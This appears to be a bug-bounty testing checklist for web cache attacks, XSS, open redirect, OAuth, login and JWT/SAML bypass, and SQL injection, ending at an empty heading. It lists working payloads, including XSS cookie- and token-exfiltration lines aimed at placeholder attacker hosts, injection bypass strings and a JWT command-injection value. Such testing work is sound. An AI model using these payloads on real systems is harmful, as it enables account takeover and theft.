# Web Bug Based Checklist

<details>

<summary>WCD/WCP</summary>

### 0. Setup & Cacheability

* [ ] Confirm response is cached: check `X-Cache`, `Cf-Cache-Status`, `Age`, `X-Cache-Hits`
* [ ] Send the request twice — does it flip `miss` → `hit`?
* [ ] Add a cache buster so every test request has a unique cache key
* [ ] Read `Cache-Control` / `Pragma` / `Vary` on the response
* [ ] Note which inputs are keyed vs unkeyed (Akamai: `Pragma: akamai-x-get-true-cache-key`)
* [ ] Enable debug headers: Akamai `Pragma: akamai-x-check-cacheable, akamai-x-cache-on` / Fastly `Fastly-Debug: 1`
* [ ] Check how the CDN treats 4xx/5xx (default error caching → DoS potential)

### 1. Unkeyed Header Fuzzing (poisoning)

* [ ] `X-Forwarded-Host` (Title-Case)
* [ ] `X-FORWARDED-HOST` (UPPERCASE)
* [ ] `x-forwarded-host` (lowercase)
* [ ] `X_Forwarded_Host` (dash → underscore)
* [ ] `X-Forwarded-Host :` (space before colon)
* [ ] Double header — send `X-Forwarded-Host` twice
* [ ] `X-Forwarded-Scheme` / `X-Forwarded-Proto`
* [ ] `X-Host` / `X-Original-URL` / `X-Rewrite-URL`
* [ ] `Forwarded`
* [ ] Bulk header wordlist (rate-limited: 1 req/sec, \~50 headers/req)

### 2. Unkeyed Cookie Fuzzing (poisoning)

* [ ] Fuzz for hidden/unkeyed cookie parameters
* [ ] Check if any cookie is reflected into the cached response

### 3. Unkeyed / Excluded Query Param Fuzzing (poisoning)

* [ ] Tracking params: `utm_.*` `gclid` `gdftrk` `_ga` `mc_.*` `trk_.*` `dm_i` `_ke` `sc_.*` `fbclid`
* [ ] Framework param: `_method`
* [ ] Bulk query wordlist (rate-limited: 1 req/sec, \~50 params/req)
* [ ] Test excluded param reflected → XSS
* [ ] Test excluded `_method` → DoS / logic change

### 4. Request Shape Discrepancies (poisoning)

* [ ] Fat GET — GET with a body the origin reads but cache ignores
* [ ] Cache-key normalization — `%2F`, casing, dot-segments decoded differently by cache vs origin
* [ ] Header-size discrepancy (origin limit < cache limit → cacheable error)
* [ ] Invalid header (`\:`, `Connection: Host`, `Upgrade: BB`) → cacheable error

### 5. Static-Extension Deception

* [ ] `path/account.css`
* [ ] `path/account.js`
* [ ] `path/account/nonexistent.css`
* [ ] `path/account/test.js` (trailing-path variant → 200)
* [ ] Less-common ext: `.avif` `.webp` `.svg` `.ico` `.woff2` `.map`
* [ ] Mind Cloudflare Cache Deception Armor (Content-Type must match ext)
* [ ] Test origin returning NO `Content-Type` header

### 6. Path-Prefix Caching

* [ ] Check if CDN caches `/path/*` or `/static/*` or `*.ext`
* [ ] Route a sensitive endpoint through the cached prefix

### 7. Path Traversal

* [ ] `../`
* [ ] `..%2F`
* [ ] `%2E%2E%2F`
* [ ] Double-encoded / Unicode variants (WAF bypass)

### 8. Delimiter Discrepancies (deception)

* [ ] `;`
* [ ] `%00`
* [ ] `%0d`
* [ ] `%0a`
* [ ] `%09`
* [ ] `?` `#` `&` `!`
* [ ] Full `%00`–`%FF` sweep
* [ ] Encoded-percent variants:
  * [ ] `user\xFUZZ` / `user\xFUZZ.js`
  * [ ] `user%FUZZ` / `user%FUZZ.js`
  * [ ] `user%25%FUZZ` / `user%25%FUZZ.js`
  * [ ] `user%25%25%FUZZ` / `user%25%25%FUZZ.js`
  * [ ] `user%FUZZ%FUZZ` / `user%FUZZ%FUZZ.js`

### 9. Chains

* [ ] Delimiter + path traversal → cache deception
* [ ] `/static/..%2Faccount%3Bx.css`
* [ ] `/assets/..%2F..%2Fapi%2Fme%00.js`
* [ ] Self-bug (self-XSS) + deception → stored XSS for others

### 10. Path-Confusion Payloads (deception)

* [ ] `example.com/nonexistent.css`
* [ ] `example.com/%0Anonexistent.css`
* [ ] `example.com/%3Bnonexistent.css`
* [ ] `example.com/%23nonexistent.css`
* [ ] `example.com/%3Fname=val nonexistent.css`

### 11. Advanced / Theoretical (DoS)

* [ ] HTTP version not in cache key → DoS
* [ ] FE/BE header-parsing discrepancy → DoS
* [ ] HTTP/2 downgrade → DoS

### 12. Confirm Impact

* [ ] Unkeyed header reflected → Stored XSS
* [ ] Unkeyed header in redirect → Stored Open Redirect
* [ ] Excluded query reflected → Stored XSS
* [ ] Cacheable error/empty/bad status → DoS
* [ ] Sensitive endpoint cached → token/PII/CSRF-token theft → ATO
* [ ] Verify victim (no cache buster) receives the poisoned/cached response
* [ ] If cached ≤5s, use Intruder NULL payloads to hold the key for PoC

</details>

<details>

<summary>XSS / HTML</summary>

### 0. Find Reflection / Sink Points

* [ ] `echo "domain.com" | gau | kxss | grep ">"` (reflected params)
* [ ] gau/waymore → collect URLs → test reflection
* [ ] Dork endpoints: `ext:php|asp|aspx|jsp|pl|cfm|py|rb|html`
* [ ] Walk every feature in Burp/ZAP, test each param for reflection (Reflector ext)
* [ ] Param discovery: Param-Miner, Arjun → test reflection of discovered params
* [ ] Check reflection in: query params, POST body, JSON fields, headers, cookies, path
* [ ] Note **how many times** and **where** the marker reflects (multiple sinks differ)

***

### 1. Identify the Reflection Context

* [ ] HTML body (between tags) → tag injection
* [ ] HTML tag attribute (quoted `"`/`'` or unquoted) → break out / event handler
* [ ] Inside `<script>` block → break JS string / statement
* [ ] Inside HTML comment `<!-- -->`
* [ ] Inside `<title>`/`<textarea>`/`<noscript>`/`<style>` (RAWTEXT/RCDATA) → needs closing tag
* [ ] URL/href/src attribute → `javascript:` scheme
* [ ] JSON response (and what chars are forbidden, e.g. `{}`)
* [ ] `<input type=hidden>` / `<link>` attribute → `accesskey` trick
* [ ] Markdown / rich-text editor
* [ ] Determine encoding applied (HTML-entity? URL? none?) — dictates payload

***

### 2. HTML Injection (no JS yet)

* [ ] `88<h1>POC</h1>88` (basic tag injection)
* [ ] `<iframe src=https://google.com></iframe>`
* [ ] Double/entity-encoded variants (`%253Ch1%253E`, `&#60;h1&#62;`) to test decode layers
* [ ] Inject a `<form>` (credential-harvest overlay)
* [ ] Open redirect: `<meta http-equiv="refresh" content="0;url=//attacker">`
* [ ] Open redirect: `<a href=//attacker><font size=100>click</font></a>`
* [ ] Set-Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">`
* [ ] Dangling-markup secret theft: `<img src='//attacker/?` (unclosed)
* [ ] CSS exfil: `<style>@import//attacker?` / `<table background='//collab?'`
* [ ] Form hijack: inject `<form action=//attacker>` before a real form
* [ ] `<noscript>` form overlay
* [ ] Portal tag: `<portal src='//attacker?`
* [ ] PasteJacking (hidden span with payload)
* [ ] HTML→SSRF: `<iframe src=//site/redirect.php?link=file:///etc/passwd>`

***

### 3. Inject an Event Handler

* [ ] WAF probe: inject `<x` → does it reach an event-handler position?
* [ ] `onxxx=yyy` — find how many `x` it accepts, adjust tag accordingly
* [ ] Agnostic handlers (tag-independent): `onblur`, `onclick`, `onmouseover`, `oncopy`, `oncut`, `onpaste`, `oninput`, `onkeydown`, `oncontextmenu`, `ondblclick`, `ondrag`
* [ ] `contenteditable` + `onblur`/`onfocus`/`oninput`/`onkeydown` (no interaction tricks)
* [ ] Auto-trigger: `onfocus + autofocus`, `style=font-size:500px onmouseover`
* [ ] Brute-force the full handler list (PortSwigger cheat-sheet) when filtered

***

### 4. XSS Without Event Handlers

* [ ] `href`: `<a href=javascript:alert(1)>click`
* [ ] `action`: `<form action=javascript:alert(1)><input type=submit>`
* [ ] `formaction`: `<form><button formaction=javascript:alert(1)>click`
* [ ] `data`: `<object data=javascript:alert(1)>`
* [ ] `srcdoc`: `<iframe srcdoc=...>`
* [ ] `xlink:href`: `<svg><script xlink:href=data:,alert(1)></script>`
* [ ] SVG `<animate>` from `javascript:` URL
* [ ] `<math><brute href=javascript:alert(1)>`

***

### 5. Inject JS / Confirm Execution

* [ ] `'"--><svg onload=alert(1)>` (break-out polyglot)
* [ ] `"'-->aaaaa<h1 onclick=alert(1)>` (context escape)
* [ ] `<img src=x onerror=alert(1)>`
* [ ] `<script>alert(document.domain)</script>`
* [ ] `<svg/onload=prompt(document.cookie)>`
* [ ] `<input/onauxclick="[1].map(prompt)">`
* [ ] `<body onbeforescriptexecute="[1].map(confirm)">`
* [ ] base64 eval: `<img src=x onerror=eval(atob('...'))>`
* [ ] popover: `<button popovertarget=x>..<input popover id=x onbeforetoggle=alert(document.cookie)>`
* [ ] Confirm with `document.domain` (proves origin) not just `alert(1)`

***

### 6. Polyglots (context-agnostic one-shots)

* [ ] `jaVasCript:/*-/*`/_\`/_'/_"/\*\*/(/_ \*/oNcliCk=alert() )//%0D%0A...\<sVg/oNloAd=alert()//>\`
* [ ] `'">><marquee><img src=x onerror=confirm(1)></marquee>...<script>prompt(1)</script>`
* [ ] `';alert(String.fromCharCode(88,83,83))//...</SCRIPT>">'><SCRIPT>...`
* [ ] Jhaddix / RSnake / Mario master polyglot strings

***

### 7. Blind XSS (stored, fires elsewhere)

* [ ] Plant in: name fields, support tickets, user-agent, referer, contact forms, image uploads
* [ ] `"><script src=//xss.report/s/XXXX></script>`
* [ ] `<img src=x id=<base64> onerror=eval(atob(this.id))>` (CSP/lenient sinks)
* [ ] XSS Hunter / xss.report / js.rip listener
* [ ] Burp Collaborator client for blind callbacks

***

### 8. DOM XSS

* [ ] Identify sources→sinks: `location`, `document.URL`, `referrer`, `postMessage`, cookie → `innerHTML`, `document.write`, `eval`, `setTimeout`, `src`
* [ ] Hash/query-driven sinks: `#payload`, `?param=`
* [ ] `postMessage` listener with no origin check → frame it and post payload
* [ ] `JSON.parse`-based message handling
* [ ] DOM cookie manipulation
* [ ] DOM clobbering to enable XSS / bypass HTML filters
* [ ] Swagger-UI: `?configUrl=`/`?url=` pointing to attacker JSON/YAML
* [ ] AngularJS template injection: `{{constructor.constructor('alert(1)')()}}`

***

### 9. Filter / WAF Bypass

* [ ] Case toggle: `<sCRipT>`, `<Svg/OnLoad>`
* [ ] Null byte / junk: `<scr\x00ipt>`, recursive `<scr<script>ipt>`
* [ ] Whitespace alts: `<svg·onload>`, `&Tab;`, `%0a`, `/**/`
* [ ] Encoding layers: URL, double-URL, unicode `\u0061`, hex `\x61`, HTML entities, `String.fromCharCode`
* [ ] Code-eval keyword bypass: `eval('ale'+'rt(1)')`, `Function('alert(1)')()`, `setTimeout('...')`, `Set.constructor`...
* [ ] `.JSON`/`.html` bypass: `...redacted.json//%3Csvg onload=...%3E.html`
* [ ] `<meta>` tag injection / ASP.NET ResolveUrl `~/(A(...))/` trick
* [ ] SVG-context WAF bypass (`xlink:href` entity-encoded)
* [ ] Markdown XSS: `[a](javascript:prompt(document.cookie))`, base64 `data:` link
* [ ] Email-field XSS: `"<svg/onload=alert(1)>"@x.y`, `["');alert(1)//"]@x.x`
* [ ] Per-WAF strings (Cloudflare/Akamai/Incapsula/Imperva/Sucuri/ModSecurity/F5/PHP-IDS/WebKnight)

***

### 10. File-Based & Header-Based

* [ ] Upload `.svg` with embedded `<script>alert()</script>`
* [ ] Polymorphic image (valid image + JS) for `<script src=img>` contexts
* [ ] File-upload **filename** as payload (intercept, rename to `<img onerror>`)
* [ ] RFI→XSS: `php?=//attacker/poc.svg`
* [ ] Host/header injection: `Host: bing.com"><script>alert(document.domain)</script>`
* [ ] Reflected XSS via HTTP request smuggling (front-end/back-end desync)

***

### 11. Escalation / Impact

* [ ] Cookie theft: `<script>new Image().src='//attacker/?'+document.cookie</script>` (needs non-HttpOnly)
* [ ] Token theft: `...+localStorage.getItem('access_token')`
* [ ] XSS→ATO via fetch to `/account` + exfil to Collaborator
* [ ] Self-XSS → reflected: save response as `.html`, confirm it executes
* [ ] Self-XSS + CORS misconfig → ATO (fetch authed API, exfil response)
* [ ] XSS→CSRF: fetch CSRF token from page, submit state-changing request
* [ ] XSS→SSRF: `<esi:include src=//internal>` / iframe to internal
* [ ] XSS→LFI: `XMLHttpRequest` GET `file:///etc/passwd` → `document.write`
* [ ] XSS→RCE (admin panels / desktop-app webviews)
* [ ] Phishing: inject `<iframe src=//attacker>` / fake login form
* [ ] Defacement / forced open-redirect
* [ ] Re-verify on clean session; record param, context, sink, and stored-vs-reflected

***

### Tooling

* [ ] kxss + gau/waymore (reflection discovery)
* [ ] Param-Miner, Arjun (hidden params)
* [ ] Burp Reflector / Reflect, Burp Collaborator
* [ ] XSS Hunter / xss.report / js.rip (blind)
* [ ] DalFox / XSStrike (automated fuzz) ; PortSwigger & Brute Logic cheat-sheets

</details>

<details>

<summary>OR &#x26; SSRF</summary>

{% code overflow="wrap" %}
```
me.com\@www.target.com
target.com\@me.com
me.com/.www.target.com
target.com/@me.com
me.com\[target.com]
me.com%ff@target.com%2F
me.com%bf:@target.com%2F
me.com%252f@target.com%2F
//me.com%0a%2523.target.com
me.com://target.com
androideeplink://me.com\@target.com
androideeplink://a@target.com:@me.com
androideeplink://target.com
target.com.me.com\@target.com
target.com%252f@me.com%2fpath%2f%3
//me.com:%252525252f@target.com
target.com.evil.com
evil.com#target.com
evil.com?target.com
/%09/me.com
me.com%09target.com
me.com\u0000@target.com
me.com%00target.com
/\me.com
me.comğ.target.com
me.com\udfff@target.com
me.com?.target.com
me.com@target.com
auspost.com.au.target.com
growanzXtarget.com
target.com/auspost.com.au
target.com%23@auspost.com.au
target.com%25%32%33@auspost.com.au
email=me@`whoami`.id.collaborator.net&
target.com@%E2%80%AE@me.com
evil.com/test@target.com
evil.com@target.com
redirect_to=////evil%E3%80%82com
evil.com%bf:@target.com
evil.com\@target.com
me.com/test@target.com
me.com%09company.com           # kept original-style pct/tab test (mapped host context)
me.com%00company.com          # null-byte style variant (mapped)
/\x08/evil.com
[test](/\x08/evil.com
```
{% endcode %}

</details>

<details>

<summary>OAuth Misconfigurations</summary>

> Run these boxes against an OAuth/social-login flow. Order: map the flow → `redirect_uri` → state/CSRF → scope → email/identity trust (ATO variants) → tokens → codes → response\_mode/prompt → injection → SSRF → headers → race → postMessage → secrets → provider-side → impact. Use two accounts (attacker + victim) and intercept the whole dance in Burp.

***

### 0. Map the Flow First

* [ ] Capture the authorization request: `GET /auth?client_id=...&redirect_uri=...&scope=...&state=...&response_type=code`
* [ ] Note the grant type (code / implicit / token), and where the code/token lands
* [ ] Find the client's `/authenticate` (token-exchange / login) endpoint
* [ ] Identify which params are reflected, validated, or trusted (email, id, redirect\_uri, state, scope)
* [ ] Brute-force legacy/unimplemented flows (try `response_type=token`, `id_token`, etc.)
* [ ] Try changing request method (GET/POST/HEAD/PUT) to see routing differences

***

### 1. redirect\_uri Validation

* [ ] Swap to attacker domain → does it redirect (open redirect → code/token theft)?
* [ ] Path traversal: `/callback/../redirect?url=//evil` , `redirect_uri=https://target/../../redirect_uri=//evil`
* [ ] Weak regex: `https://target.com.evil.com`
* [ ] Subdomain/suffix: `target.com.evil.com`, `evil.com#target.com`, `evil.com?target.com`
* [ ] `//attacker.com` (scheme-relative)
* [ ] `https://attacker.com\@target.com`
* [ ] `https://attacker.com?@target.com`
* [ ] `https://target.com\@me.com` / `https://me.com\@target.com`
* [ ] CRLF: `attacker.com%0d%0atarget.com`
* [ ] Null/invisible bytes `%00`–`%FF`: `me.com%5btarget.com`, `me.com%ff@target.com%2F`
* [ ] Encoded slashes: `target.com%252f@me.com%2fpath`, `//me.com%252525252f@target.com`
* [ ] Deep-link schemes: `androideeplink://me.com\@target.com`
* [ ] Tab/newline: `/%09/me.com`, `me.com%09target.com`, `/\me.com`
* [ ] IDN homograph: `redirect_uri=https://www.cṍmpany.com`
* [ ] Open-redirect/SSRF elsewhere on site → chain to bypass redirect\_uri allowlist
* [ ] HTML injection / XSS via reflected redirect\_uri
* [ ] `data:` URI redirect → DOM XSS
* [ ] `javascript:` redirect\_uri in token exchange

***

### 2. state Parameter / CSRF

* [ ] No `state` param at all → login/linking CSRF
* [ ] Static `state` value (same every time) → reusable → CSRF
* [ ] Remove `state` and check if still accepted
* [ ] Predictable/guessable `state`
* [ ] Forced profile linking: drop the request, send the link to victim → their account links to attacker's social profile
* [ ] OAuth `state` null byte `%00` → bypass → 1-click ATO
* [ ] Is `state` actually tied to the user session?

***

### 3. scope Manipulation

* [ ] Remove `email` from scope → ATO/pre-ATO (account created without verified email)
* [ ] Modify Google `hd=` param (`company.com` → `gmail.com`) to connect non-org email
* [ ] Inject `admin@company.com` as email value in scope → extra privileges
* [ ] Access-token scope abuse: use token on elevated-scope endpoints
* [ ] SSTI in scope: `${T(java.lang.Runtime).getRuntime().exec("calc")}` → RCE

***

### 4. Email / Identity Trust — ATO Variants

> The core of OAuth ATO: the client trusts an email/identity the attacker controls.

* [ ] **Microsoft nOAuth:** set attacker MS account email to victim's → log into target as victim
* [ ] **Facebook OAuth misconfig:** Sign in with FB → "Edit Access" → uncheck email → logged in without email → set email to victim's (0-click)
* [ ] **Discord OAuth:** victim has email+pass on target; attacker makes a Discord account with victim's email (Discord skips email confirmation) → sign in with Discord → ATO
* [ ] **Auth0 misconfig (0-click):** victim signed up via Google; attacker signs up with victim's email+pass → takeover
* [ ] **1-click ATO:** register with victim's email+pass via provider; victim clicks the confirmation link → ATO (0-click if no confirmation)
* [ ] **Phone-number account (0-click):** sign up on 3rd party with phone (no email) → log into target → in settings add victim's email
* [ ] **Pre-ATO:** register target account with victim's email + attacker password; victim later OAuths in, linking to attacker creds
* [ ] **IDN/punycode email trust:** provider (e.g. GitLab) accepts homographed emails → 0-click ATO
* [ ] **OKTA SSO org-switch:** invite victim to attacker org, create Okta user with victim's email, log in as victim, switch to victim's org

***

### 5. Access-Token Attacks

* [ ] Use access token from YOUR app instead of victim app's token (no audience validation)
* [ ] **Token reuse:** grab a valid provider token from another app using the same provider, replay against target
* [ ] Token not bound to client (audience/azp not checked)
* [ ] Use OAuth token while logged in as a DIFFERENT provider user (shared token confusion — HackerOne #46485 pattern)
* [ ] Access token stored in browser history
* [ ] Token leaked in Referer header on navigation

***

### 6. Authorization-Code Attacks

* [ ] Reuse the authorization code more than once
* [ ] Code valid across different applications/clients
* [ ] Brute-force the code (short/guessable)
* [ ] Everlasting code (no short expiry) → wide attack window
* [ ] XSS in `code=` param if reflected: `code=,%2520alert(123))%253B//`
* [ ] Reuse code with XSS payload appended: `code=AuthCode<script>alert(1)</script>`
* [ ] Code/state leaked in Referer header

***

### 7. response\_mode / prompt Tricks

* [ ] `prompt=none` → silent flow, minimizes/eliminates user interaction (combine with other attacks)
* [ ] `response_mode=fragment` → code lands after `#` → leak via open redirect
* [ ] `response_mode=form_post` + XSS on auth server → steal code/state from the auto-POST form
* [ ] `response_mode=query` (default) baseline
* [ ] Post-auth redirect + login CSRF: open redirect + `response_mode=fragment` → victim's code goes to attacker site after `#`

***

### 8. Injection in OAuth Endpoints

* [ ] XSS in Connect/Callback: `/oauth/Connect?)%7D(alert)(location);%7B%3C!--&...`
* [ ] XSS via error trigger: `client_id=<marquee onfinish=prompt(document.domain)>`
* [ ] Add `.json`/`.xml` extension to endpoint (`/oauth/Connect.json`) → token may leak in response
* [ ] IDOR in `id=` param → change to victim's id → ATO
* [ ] SSTI in scope/params → RCE

***

### 9. SSRF via OpenID / Dynamic Client Registration

* [ ] Browse `/.well-known/openid-configuration` → find registration endpoint
* [ ] POST to register a client
* [ ] Test `logo_uri` for SSRF (read cloud metadata)
* [ ] Test other URI params (`jwks_uri`, `sector_identifier_uri`, `request_uri`)
* [ ] Proxy-page: use SSRF to steal tokens from metadata

***

### 10. Host / Referer Header Tricks

* [ ] `Host: me.com/www.company.com` (host confusion)
* [ ] `Host: www.company.com` with `Referer: https://me.com/path`
* [ ] Insert attacker domain in Referer to bypass referer-based checks

***

### 11. Race Conditions

* [ ] Send simultaneous requests on callback/OTP (Turbo Intruder)
* [ ] Race the code-exchange endpoint
* [ ] Provider-side race conditions (double-spend a code, concurrent linking)

***

### 12. postMessage Exploitation

* [ ] Find `postMessage(Msg,"*")` where `Msg = location.href.split("#")[1]`
* [ ] Confirm no `X-Frame-Options` on the page
* [ ] Frame the OAuth page with attacker `redirect_uri` → catch token via postMessage listener

***

### 13. Secrets

* [ ] `client_secret` leaked (in JS, mobile app, repo) → mint tokens
* [ ] Brute-force `client_secret` on `/token` endpoint
* [ ] Refresh token not bound to client / never expires / reusable

***

### 14. Provider-as-a-Service Side

* [ ] If target IS an OAuth provider: open redirect with punycode domain on the provider redirect
* [ ] Provider accepts IDN/homographed emails (email-trust 0-click)
* [ ] OAuth hijacking (intercept/relay the provider response)

***

### 15. Confirm Impact

* [ ] Full ATO (0-click / 1-click)
* [ ] Pre-ATO (reserve victim identity before signup)
* [ ] Authorization-code / access-token theft
* [ ] Privilege escalation via scope/email/id
* [ ] SSRF → metadata/cloud creds
* [ ] RCE (SSTI)
* [ ] XSS in auth flow
* [ ] Re-verify on clean accounts; document exactly which validation was missing (state / redirect\_uri / email-verify / audience / code-reuse)

</details>

<details>

<summary>Authentication Issues</summary>

> Run these boxes against a login / auth flow. Group order: pre-auth recon → login bypass (injection + logic) → password/session handling → JWT → SAML → OTP/2FA → impact. Capture every request in your proxy before tampering.

***

### 0. Recon & Quick Wins

* [ ] Read page source / HTML comments (scroll right too) for creds, hints, hidden fields
* [ ] Try directly accessing restricted pages (forced browsing) without auth
* [ ] Check `autocomplete="off"` missing on password/sensitive inputs
* [ ] Check Secure / HttpOnly flags on session cookies
* [ ] Look for token/password leaking in the URL
* [ ] Default credentials (root/admin/tech-name/default user) — DefaultCreds-cheat-sheet, SecLists
* [ ] Build a target-specific wordlist (h0tak88r casing/permutation script) + crunch
* [ ] Username enumeration via login / register / reset error differences
* [ ] GraphQL: many auth attempts batched in one request (rate-limit bypass)

***

### 1. Login Bypass — Email / Parameter Tricks

* [ ] `yourname@wearehackerone.com` / `@bugcrowd.com` variants
* [ ] Nested email: `lol@company.com@collaborator.net`
* [ ] Don't send the parameters — send none, or only one
* [ ] PHP type juggling: `user[]=a&pwd=b`
* [ ] PHP type juggling: `user=a&pwd[]=b`
* [ ] PHP type juggling: `user[]=a&pwd[]=b`
* [ ] Change Content-Type to JSON, send JSON values (include bool `true`)
* [ ] POST-not-supported → send JSON in body with **GET** + `Content-Type: application/json`
* [ ] Node.js parsing: `password[password]=1`
* [ ] Node.js JSON: `"password":{"password": 1}` (need a valid username)

***

### 2. Login Bypass — Injection

**SQL injection auth bypass** (try in username and password):

* [ ] `' or '1'='1`
* [ ] `' or ''='`
* [ ] `' or 1]%00`
* [ ] `' or /* or '`
* [ ] `' or "a" or '`
* [ ] `' or 1 or '`
* [ ] `' or true() or '`
* [ ] `admin' or '`
* [ ] `admin' or '1'='2`
* [ ] `'or string-length(name(.))<10 or'` (XPath)
* [ ] `'or contains(name,'adm') or'` (XPath)
* [ ] `'or position()=2 or'` (XPath)

**NoSQL injection auth bypass:**

* [ ] `username[$ne]=x&password[$ne]=x`
* [ ] `{"username":{"$ne":null},"password":{"$ne":null}}`
* [ ] `{"username":{"$gt":""},"password":{"$gt":""}}`
* [ ] `admin'||'1'=='1` (JS injection in NoSQL)

**LDAP injection auth bypass:**

* [ ] `*`
* [ ] `*)(&`
* [ ] `*)(|(&`
* [ ] `*)(|(*`
* [ ] `admin)(&)`
* [ ] `admin)(!(&(|`
* [ ] `pwd)` / `pwd))` variations

***

### 3. Password Handling & Logic

* [ ] Empty password (some accounts accept blank)
* [ ] Password-type attribute flip (e.g. `type=2 → type=1` cleartext) then brute
* [ ] Null/edge password values: `-1`, `0`, `9999999999`, empty
* [ ] Response manipulation: change `302`/fail → `200`/success
* [ ] Response manipulation: flip `false`→`true`, change `role`/`ID`/status code (PrevEsc)
* [ ] Burp Match & Replace to rewrite identity (`lol@sso.com → lol@gmail.com`)
* [ ] Changing authentication type to null
* [ ] Weak password policy (change/reset/register accept simple passwords)
* [ ] Password change without asking current password
* [ ] Email change without password confirmation

***

### 4. Session, Token & Endpoint Logic

* [ ] Refresh-token endpoint: remove `Authorization` header + change `username` → token for any user
* [ ] "Remember me" cookie: decode/forge for ATO; check it survives password change
* [ ] Improper MS SSO: oversized content-length on redirect leaks internal response → flip `302`→`200`, delete `Location`
* [ ] Auth bypass via subdomain takeover (cookie scoped to `.domain.com`)
* [ ] CMS portlet access (Liferay `p_p_id=58` → reach Create Account / hidden portlets)
* [ ] Spring Actuator endpoints exposed / broken auth
* [ ] Over-permissive "not-login token" reused on sensitive endpoints (TikTok-style)
* [ ] Token not scoped to app/audience — reused across endpoints/services

***

### 5. JWT — Triage (jwt\_tool first)

* [ ] `jwt_tool -M at -t <url> -rh "Authorization: Bearer <jwt>"` (all tests)
* [ ] **Required?** remove token — does request still succeed?
* [ ] **Checked?** delete last chars of signature — error / different / same?
* [ ] **Persistent?** replay same token after logout / 24h — still valid (immortal)?
* [ ] **Origin?** token first seen server-side, not client-side?
* [ ] **Claim order?** tamper a reflected payload claim, keep signature — processed?
* [ ] Sensitive data exposure in payload (decode it)

### 6. JWT — Signature & Key Attacks

* [ ] `alg:none` / `None` / `NONE` / `nOnE` + empty signature (`jwt_tool -X a`)
* [ ] Accept arbitrary signature / null signature (CVE-2020-28042)
* [ ] Strip signature entirely (`jwt_tool -X n`)
* [ ] Crack HMAC secret — hashcat `-m 16500` / `jwt_tool -C -d wordlist`
* [ ] RS256→HS256 algorithm confusion (sign with public key as HMAC secret)
* [ ] Algorithm confusion, no exposed key — `rsa_sign2n` / `sig2n` to recover key
* [ ] Find public key: `/jwks.json`, `/.well-known/jwks.json`, `/openid/connect/jwks.json`, `/api/keys`

### 7. JWT — Header Parameter Injection

* [ ] `jwk` — embedded key (Burp Embedded JWK / `jwt_tool -X i`, CVE-2018-0114)
* [ ] `jku` — point JWK Set URL to attacker-monitored server
* [ ] `kid` — path traversal `../../../../dev/null` + sign with null byte (`AA==`)
* [ ] `kid` — load known file (CSS/JS) as HMAC secret to verify
* [ ] `kid` — SQL injection (`xxxx' UNION SELECT 'aaa`)
* [ ] `kid` — command injection (`key.crt; whoami && ...`)
* [ ] `x5u` — attacker self-signed cert URL
* [ ] `x5c` — embedded attacker cert chain
* [ ] `x5t` / `cty` (try `cty: text/xml` or java-serialized → XXE/deser)

### 8. JWT — Claims & Misc

* [ ] `exp` — replay after expiry; check if token ever expires
* [ ] `nbf` — bypass not-before claim
* [ ] `jti` — replay when ID space too small / not enforced
* [ ] Cross-service relay — token from sibling client of same JWT service accepted?
* [ ] Example/sample token (Microsoft v1.0 id\_token) accepted (missing audience check)
* [ ] ATO from IDOR — swap user\_id in payload (leaked via wrong-password/reset response)

***

### 9. SAML

* [ ] Edit assertion (e.g. email → `admin@target`) **without** touching signature
* [ ] Remove the entire `<Signature>` (signature stripping)
* [ ] Remove only the `<SignatureValue>` value
* [ ] XML comment injection: register `admin<!--1-->@target` (parser strips comment)
* [ ] XML Signature Wrapping (XSW) — duplicate/move signed/unsigned assertions
* [ ] `ds:Reference URI` SSRF (PySAML2): `URI="http://attacker/?#id..."`
* [ ] CVE-2021-21239 — strip `SignatureValue`/`DigestValue`, re-sign with own key (xmlsec1)
* [ ] Mis-scoped SAML session — attacker-configured IdP (Okta) provisions victim email → SP issues victim session
* [ ] Replace recipient/destination/audience in assertion
* [ ] Reuse/replay a SAMLResponse (no one-time enforcement)

***

### 10. OTP / 2FA Bypass

* [ ] Omit the `code`/`otp` parameter entirely
* [ ] Send empty / null OTP value
* [ ] Response manipulation on OTP verify (`false`→`true`, `302`→`200`)
* [ ] Reuse a verify/2FA-setup token on a different action (unlink email/phone)
* [ ] 2FA can be disabled while logged in without re-entering password
* [ ] Brute force OTP (no rate limit) — Intruder, large window
* [ ] Race condition on OTP/verify endpoint
* [ ] 2FA not enforced on OAuth/social linking path
* [ ] Backup-code / recovery-flow weaker than primary 2FA

***

### 11. Confirm Impact

* [ ] Full ATO (login as victim)
* [ ] Pre-ATO (reserve victim identity before signup)
* [ ] Privilege escalation (user → admin via claim/role tamper)
* [ ] Auth bypass to sensitive data / internal endpoints
* [ ] Verify on a clean session / second account that the bypass reproduces
* [ ] Document exactly which control was skipped and what the attacker must supply

***

### Tooling

* [ ] `jwt_tool` (triage + forge), JWT Editor + JOSEPH Burp extensions
* [ ] `hashcat -m 16500` (JWT HMAC crack), JWT-Heartbreaker (weak-key detect)
* [ ] `rsa_sign2n` / `portswigger/sig2n` (recover public key for alg confusion)
* [ ] `xmlsec1` (SAML re-signing), SAML Raider Burp extension
* [ ] DefaultCreds-cheat-sheet, SecLists default passwords, crunch (wordlists)

</details>

<details>

<summary>SQL Injection</summary>

> Run these boxes against an injectable surface. Order: find injection points → detect → identify type/DBMS → confirm → exploit (UNION/boolean/error/time/OOB) → second-order → WAF bypass → automate → impact. Add a unique marker per probe so you can track which input reflected.

***

### 0. Map the Attack Surface (where to inject)

* [ ] **ID-based params** (`?id=`, `user_id`, `pid`) — most common
* [ ] Login form — username/email field
* [ ] Login form — password field
* [ ] Remember-me cookie value
* [ ] Session tokens
* [ ] OAuth callback parameters
* [ ] 2FA/MFA endpoints
* [ ] Search: main input, search API, advanced filters, autocomplete/typeahead
* [ ] Account recovery: forgot-password input, reset link, verification, username lookup
* [ ] Admin / CMS panels
* [ ] E-commerce: cart, checkout, payment callbacks, invoice gen, order-status lookup
* [ ] Profile/settings: edit endpoints, view-by-ID, notification prefs
* [ ] User content: comments, reviews/ratings, contact forms, support tickets
* [ ] List/filter controls: `page=`, `sort=`, `order=`, category dropdowns, date ranges
* [ ] **Non-obvious inputs:** HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, JSON body fields, GraphQL args, file-upload names

***

### 1. Recon / Tooling Setup

* [ ] Burp Active Scan + Agartha extension on candidate requests
* [ ] Subdomains → crawl → `gf sqli urls >> sqli` → `sqlmap -m sqli --dbs --batch`
* [ ] Dork `.php`/likely-vuln paths → `Arjun` (param discovery) → `sqlmap`
* [ ] Identify request method, content-type, and which params echo into the response

***

### 2. Detection — Break the Query

